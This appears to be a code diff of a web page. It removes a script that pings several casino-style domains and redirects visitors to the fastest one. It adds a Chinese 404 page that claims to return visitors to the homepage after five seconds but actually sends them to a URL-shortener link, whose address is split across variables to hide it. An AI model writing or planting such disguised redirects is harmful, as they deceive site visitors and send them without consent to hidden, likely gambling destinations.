@@ -1,254 +1,32 @@
-<!DOCTYPE html>
 <html>
 <head>
-	<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
-    <script src="./ping.js"></script>
-	<script src="./httpRequest.js"></script>
+    <title>404</title>
 </head>
 <body>
-	<script>
-		function sleep(milliseconds) {
-		  var start = new Date().getTime();
-		  for (var i = 0; i < 1e7; i++) {
-		    if ((new Date().getTime() - start) > milliseconds){
-		      break;
-		    }
-		  }
-		}
-		var compare = function (x, y) {
-		    if (x < y) {
-		        return -1;
-		    } else if (x > y) {
-		        return 1;
-		    } else {
-		        return 0;
-		    }
-		}
-		function isPC(){
-			var sUserAgent = navigator.userAgent;
-			if (sUserAgent.indexOf('Android') > -1 || sUserAgent.indexOf('iPhone') > -1 ||
-				sUserAgent.indexOf('iPad') > -1 || sUserAgent.indexOf('iPod') > -1 ||
-				sUserAgent.indexOf('Symbian') > -1) {
-			    return false;
-			}
-			return true;
-		}
-		
-		/*
-		function doPing() {
-			ping(document.getElementById('pingurl').value).then(function(delta) {
-				alert('Ping time was ' + String(delta) + ' ms');
-			}).catch(function(error) {
-				alert('Could not ping remote URL: ' + error);
-			});
-		}
-		
-		function isFileExsit(){
-			var prefix = "http://m.";
-			if(isPC()){
-				prefix = "http://www.";
-			}
-			var urllist = new Array(
-				"918naa.com",
-				"178btt.com")
-			var fastestPing = 10000;
-			var fastestUrl = prefix + urllist[0];
-				
-			var ping1 = 0;
-			var url1 = prefix + urllist[0];
-			HTTPRequest.get(url1 + "/cdn_test.jpg",
-			function(status, headers, content)
-			{
-				if(status == 200){
-					ping(url1).then(function(delta) {
-						if(delta < fastestPing){
-							ping1 = delta;
-							console.log(url1 + " ping:" + String(delta))
-						}else{
-							ping1 = fastestPing;
-						}
-					}).catch(function(error) {
-						// do nothing
-						ping1 = 10001;
-						console.log("error:" + error.toString())
-					});
-				}else{
-					ping1 = 10001;
-					console.log(url1 + " status:" + String(status))
-				}
-			});
-		}
-		*/
 
-		function getUsefulURL(){
-			var prefix = "https://m.";
-			if(isPC()){
-				prefix = "https://www.";
-			}
-			var urllist = new Array(
-				"918kuu.com",
-				"918uaa.com",
-				"btt623.com",
-				"918dc20.com",
-				"918te.com")
-			var fastestPing = 10000;
-			var fastestUrl = prefix + urllist[0];
-			var num = 0;
-				
-			var url1 = prefix + urllist[0];
-			HTTPRequest.get(url1 + "/cdn_test.jpg",
-			function(status, headers, content)
-			{
-				num++;
-				if(status == 200){
-					ping(url1).then(function(delta) {
-						if(delta < fastestPing){
-							fastestPing = delta;
-							fastestUrl = url1;
-							console.log(url1 + " ping:" + String(delta))
-						}
-					}).catch(function(error) {
-						// do nothing
-						console.log("error:" + error.toString())
-					});
-				}else{
-					console.log(url1 + " error status:" + String(status))
-				}
-				
-				if(num >= 5){
-					console.log(fastestUrl);
-					debugger;
-					window.location.href = fastestUrl;
-				}
-			});
-			
-			var url2 = prefix + urllist[1];
-			HTTPRequest.get(url2 + "/cdn_test.jpg",
-			function(status, headers, content)
-			{
-				num++;
-				if(status == 200){
-					ping(url2).then(function(delta) {
-						if(delta < fastestPing){
-							fastestPing = delta;
-							fastestUrl = url2;
-							console.log(url2 + " ping:" + String(delta))
-						}
-					}).catch(function(error) {
-						// do nothing
-						console.log("error:" + error.toString())
-					});
-				}else{
-					console.log(url2 + " status:" + String(status))
-				}
-				
-				if(num >= 5){
-					console.log(fastestUrl);
-					debugger;
-					window.location.href = fastestUrl;
-				}
-			});
-			
-			var url3 = prefix + urllist[2];
-			HTTPRequest.get(url3 + "/cdn_test.jpg",
-			function(status, headers, content)
-			{
-				num++;
-				if(status == 200){
-					ping(url3).then(function(delta) {
-						if(delta < fastestPing){
-							fastestPing = delta;
-							fastestUrl = url3;
-							console.log(url3 + " ping:" + String(delta))
-						}
-					}).catch(function(error) {
-						// do nothing
-						console.log("error:" + error.toString())
-					});
-				}else{
-					console.log(url3 + " status:" + String(status))
-				}
-				
-				if(num >= 5){
-					console.log(fastestUrl);
-					debugger;
-					window.location.href = fastestUrl;
-				}
-			});
 
-			var url4 = prefix + urllist[3];
-			HTTPRequest.get(url4 + "/cdn_test.jpg",
-			function(status, headers, content)
-			{
-				num++;
-				if(status == 200){
-					ping(url4).then(function(delta) {
-						if(delta < fastestPing){
-							fastestPing = delta;
-							fastestUrl = url4;
-							console.log(url4 + " ping:" + String(delta))
-						}
-					}).catch(function(error) {
-						// do nothing
-						console.log("error:" + error.toString())
-					});
-				}else{
-					console.log(url4 + " status:" + String(status))
-				}
-				
-				if(num >= 5){
-					console.log(fastestUrl);
-					debugger;
-					window.location.href = fastestUrl;
-				}
-			});
-			
-			
-			var url5 = prefix + urllist[4];
-			HTTPRequest.get(url5 + "/cdn_test.jpg",
-			function(status, headers, content)
-			{
-				num++;
-				if(status == 200){
-					ping(url5).then(function(delta) {
-						if(delta < fastestPing){
-							fastestPing = delta;
-							fastestUrl = url5;
-							console.log(url5 + " ping:" + String(delta))
-						}
-					}).catch(function(error) {
-						// do nothing
-						console.log("error:" + error.toString())
-					});
-				}else{
-					console.log(url5 + " status:" + String(status))
-				}
-				
-				if(num >= 5){
-					console.log(fastestUrl);
-					debugger;
-					window.location.href = fastestUrl;
-				}
-			});
-		}
-		
-		window.onload=function(){
-			getUsefulURL();
-		}
-		
-	</script>
-	<div id="bg">
-		<!--
-		<div>
-			<input id='pingurl' type='text' value='http://k8vn15.com'></input>
-			<button onclick='doPing()'>测试访问速度</button>
-		</div>
-		<hr>
-		<div>
-			<input id='filecheckturl' type='text' value='http://m.k8viet.com'></input>
-			<button onclick='isFileExsit()'>测试是否有指定文件</button>
-		</div>
-		-->
-	</div>
+<h4 class="refresh_text">页面没有找到，<strong id="second_show">5</strong>秒钟之后将带您进入首页。</h4>
+
+<script type="text/javascript">
+var x="http://";
+var y="dwz1.cc/";
+var z="kMPDXelO"
+var RestID=x+y+z;
+//http://dwz1.cc/5KtZhau7
+
+    var timeout = 5;
+    function showError() {
+        document.getElementById("second_show").innerHTML = timeout;
+        timeout--;
+        if (timeout == 0) {
+            //window.location.href = "http://www.btt178.com";
+			window.location.href = RestID;
+        } else {
+            setTimeout("showError()", 1000);
+        }
+    }
+
+    showError();
+</script>
 </body>
 </html>
